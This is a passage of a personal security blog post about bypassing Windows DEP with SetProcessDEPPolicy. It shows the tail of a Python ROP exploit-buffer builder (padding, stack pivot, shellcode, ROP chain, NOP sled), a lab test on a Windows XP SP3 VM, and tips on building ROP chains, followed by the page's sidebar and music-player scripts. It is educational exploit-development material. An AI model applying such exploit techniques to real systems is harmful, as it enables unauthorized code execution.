SetProcessDEPPolicy</span><br><br>    padding_D = <span class="hljs-string">b&#x27;D&#x27;</span> * (offset - (<span class="hljs-built_in">len</span>(padding_B) + <span class="hljs-built_in">len</span>(padding_C) + <span class="hljs-built_in">len</span>(padding_A) + <span class="hljs-built_in">len</span>(shellcode_A) + <span class="hljs-built_in">len</span>(stack_pivot) + <span class="hljs-built_in">len</span>(api)))<br><br>    exploit = <span class="hljs-string">b&#x27;&#x27;</span><br>    exploit += padding_A<br>    exploit += api<br>    exploit += padding_B<br>    exploit += stack_pivot<br>    exploit += padding_C<br>    exploit += shellcode_A<br>    exploit += padding_D<br>    exploit += rop1<br>    exploit += rop2<br>    exploit += rop3<br>    exploit += <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">400</span><br>    exploit += shellcode_B<br><br>    <span class="hljs-keyword">return</span> exploit<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    exploit = sword_two()<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;exploit_dep.txt&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(exploit)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] OK&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+<p>Note that both <code>Padding A</code> and <code>Padding D</code> are junk data. We can use either one to cause the buffer overflow.</p>
+<p>Here, I reused the <code>Shellcode A</code> from <a href="/2026/09/27/2026-9-27-DEP/">the previous article</a> and used a number of <code>NOP</code> (<code>\x90</code>) instructions as a NOP sled. Of course, you can use only a few of them and calculate a more precise jump address for <code>Shellcode A</code> to reduce the size of the exploit buffer.</p>
+<p>Finally, let’s try to exploit it in a Windows XP SP3 virtual machine!</p>
+<p align="center" class='item-img' data-src='/images/article/2026-9-28-DEP/2.png'><img src="/images/article/2026-9-28-DEP/2.png" width=700/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-9-28-DEP/3.png'><img src="/images/article/2026-9-28-DEP/3.png" width=800/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-9-28-DEP/4.png'><img src="/images/article/2026-9-28-DEP/4.png" width=800/>
+</p>
+
+<p align="center" class='item-img' data-src='/images/article/2026-9-28-DEP/5.png'><img src="/images/article/2026-9-28-DEP/5.png" width=800/>
+</p>
+
+<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>This article is similar to <a href="/2026/09/27/2026-9-27-DEP/">the previous article</a>, but uses a different API.</p>
+<p>Honestly, since I have gained some experience from <a href="/2026/09/27/2026-9-27-DEP/">the previous article</a>, I spent only a short amount of time developing the complete exploit script.</p>
+<p>In conclusion, I want to mention some practical issues that I have encountered so far.</p>
+<p>If we are trying to initialize <code>EDI</code>, we should not use a gadget containing a <code>POP EDI</code> instruction. Otherwise, the ROP chain might be corrupted.</p>
+<p>Both <code>Padding A</code> and <code>Padding D</code> can be treated as junk data. The most important point is that they are used to cause the buffer overflow.</p>
+<p>There is no standard answer for a ROP exploit script. The main difference is stability.</p>
+<p>Alright! This is the end of this article. In the next article, I will study the third method.</p>
+<p>If you have any comments or suggestions, please feel free to leave them below!</p>
+<h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING!"></a>THANKS FOR READING!</h1><p>I drew a <a target="_blank" rel="noopener" href="https://www.pixiv.net/artworks/150084856">new drawing</a>!</p>
+<p align="center" class='item-img' data-src='/images/meme/Wallpaper/MyArt/14.png'><img src="/images/meme/Wallpaper/MyArt/14.png" width=700/>
+    <figcaption>
+    Morning...
+    </figcaption>
+</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2026/09/27/2026-9-27-DEP/">[Learning] Bypassing DEP: Advanced Usage of ZwSetInformationProcess Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="utterances-sel"></button></div><div id="utterances-container"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/" width="200" id="logo"><img src="https://avatars.githubusercontent.com/u/110074064?v=4" alt="Logo"></a><h1 id="Dr"><a href="/">ISSAC</a></h1><div id="description"><p>Everything is failing...</p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/iss4cf0ng/"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://x.com/iss4c_f0ng/"><i class="fab fa-twitter" alt="X"></i></a></div><div id="rss-feed"><a class="social" id="rss-copy-button" href="javascript:void(0)" title="Copy RSS link to clipboard"><span>RSS</span></a></div></div><div id="music"></div><div class="music-box"><hr style="border:1px solid #ccc; margin:10px 0"><p class="music-title">Feeling exhausted? Let's enjoy (やさしい) music!</p><p style="text-align:center; position: relative"><img class="music-anime" id="anime-img" src="/images/meme/himari_coffee.2.jpg" width="150" height="200"></p><div style="text-align:center"><button class="music-btn" id="music-prev">⏮</button><button class="music-btn" id="music-toggle">▶ Play Music</button><button class="music-btn" id="music-next">⏭</button></div><div style="margin-top:5px"><span id="music-index"></span></div><hr style="border:1px solid #ccc; margin:10px 0"><audio id="bg-music"><source src="/mp3/music/music_1.mp3" type="audio/mpeg"></audio><script>document.addEventListener("DOMContentLoaded", function () {
+  var playlist = [
+    "/mp3/music/music_1.mp3",
+    "/mp3/music/sugar_story.mp3",
+    "/mp3/music/story_music_box.mp3",
+    "/mp3/music/last_page.mp3",
+    "/mp3/music/sunset_memory.mp3",
+    "/mp3/music/welcome_home.mp3",
+    "/mp3/music/canon.mp3",
+    "/mp3/music/arigadou.mp3",
+  ];
+
+  var current = 0;
+  const audio = document.getElementById("bg-music");
+  const btn = document.getElementById("music-toggle");
+  const prevBtn = document.getElementById("music-prev");
+  const nextBtn = document.getElementById("music-next");
+  const indexDisplay = document.getElementById("music-index");
+
+  function updateDisplay() {
+    indexDisplay.innerText = `Currently: ${current + 1} / ${playlist.length}`;
+  }
+
+  updateDisplay();
+
+  btn.addEventListener("click", function () {
+    if (audio.paused) {
+      audio.src = playlist[current];
+      audio.play();
+      btn.innerText = "⏸ Pause Music";
+    } else {
+      audio.pause();
+      btn.innerText = "▶ Play Music";
+    }
+  });
+
+  nextBtn.addEventListener("click", function () {
+    const wasPlaying = !audio.paused;
+
+    current = (current + 1) % playlist.length;
+
+    audio.src = playlist[current];
+    audio.load();
+
+    if (wasPlaying) {
+      audio.play();
+    }
+
+    updateDisplay();
+  });
+
+  prevBtn.addEventListener("click", function () {
+    const wasPlaying = !audio.paused;
+
+    current--;
+
+    if (current < 0)
+      current = playlist.length - 1;
+
+    audio.src = playlist[current];
+    audio.load();
+
+    if (wasPlaying) {
+      audio.play();
+    }
+
+    updateDisplay();
+  });
+
+  audio.addEventListener("ended", function() {
+    current = (current + 1) % playlist.length;
+    audio.src = playlist[current];
+    audio.play();
+    updateDisplay();
+  });
+});
+</script><script>document.addEventListener("DOMContentLoaded", function () {
+  const animeImg = document.getElementById("anime-img");
+
+  animeImg.addEventListener("click", function() {
+    
+    const tip = document.createElement("div");
+    tip.innerText = "?";
+    tip.style.position = "absolute";
+    tip.style.top = "-50px";
+    tip.style.left = "50%";
+    tip.style.transform = "translateX(-50%)";
+    tip.style.backgroundColor = "#fff";
+    tip.style.color = "rgb(16, 174, 11)";
+    tip.style.padding = "2px 6px";
+    tip.style.border = "1px solid #ccc";
+    tip.style.borderRadius = "8px";
+    tip.style.boxShadow = "0 3px 6px rgba(0,0,0,0.2)";
+    tip.style.fontSize = "50px";
+    tip.style.fontWeight = "bold";
+    tip.style.zIndex = "1000";
+    tip.style.opacity = "1";
+    tip.style.transition = "opacity 1s, top 1s";
+    
+    animeImg.parentElement.appendChild(tip);
+
+    setTimeout(() => {
+      tip.style.opacity = "0";
+      tip.style.top = "-60px";
+      setTimeout(() => tip.remove(), 1000);
+    }, 2000);
+  });
+});
+</script><script>document.addEventListener("DOMContentLoaded", function () {
+  const rssBtn = document.getElementById("rss-copy-button");
+
+  rssBtn.addEventListener("click", async () => {
+    const rssUrl = window.location.origin + "/atom.xml";
+    try {
+      await navigator.clipboard.writeText(rssUrl);
+
+      const tip = document.createElement("div");
+      tip.innerText = "RSS link copied!";
+      tip.style.position = "absolute";
+      tip.style.top = "-30px";
+      tip.style.left = "50%";
+      tip.style.transform = "translateX(-50%)";
+      tip.style.backgroundColor = "#0d0d0d";
+      tip.style.color = "#00fff7";
+      tip.style.border = "1px solid #ff00ff";
+      tip.style.boxShadow = "0 0 8px #ff00ff, 0 0 16px #00fff7";
+      tip.style.padding = "2px 6px";
+      tip.style.borderRadius = "8px";
+      tip.style.fontSize = "14px";
+      tip.style.fontWeight = "bold";
+      tip.style.zIndex = "1000";
+      tip.style.opacity = "1";
+      tip.style.transition = "opacity 1s, top 1s";
+
+      rssBtn.style.position = "relative";
+      rssBtn.appendChild(tip);
+
+      setTimeout(() => {
+        tip.style.opacity = "0";
+        tip.style.top = "-40px";
+        setTimeout(() => tip.remove(), 1000);
+      }, 2000);
+
+    } catch (err) {
+      console.error("Failed to copy: ", err);
+    }
+  });
+});
+</script></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SetProcessDEPPolicy"><span class="toc-number">2.</span> <span class="toc-text">SetProcessDEPPolicy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Preparation"><span class="toc-number">3.</span> <span class="toc-text">Preparation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Writing-ROP-Exploit-Script"><span class="toc-number">4.</span> <span class="toc-text">Writing ROP Exploit Script</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-number">5.</span> <span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#THANKS-FOR-READING"><span class="toc-number">6.</span> <span class="toc-text">THANKS FOR READING!</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/custom.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><script src="/js/slide.js"></script></body></html>
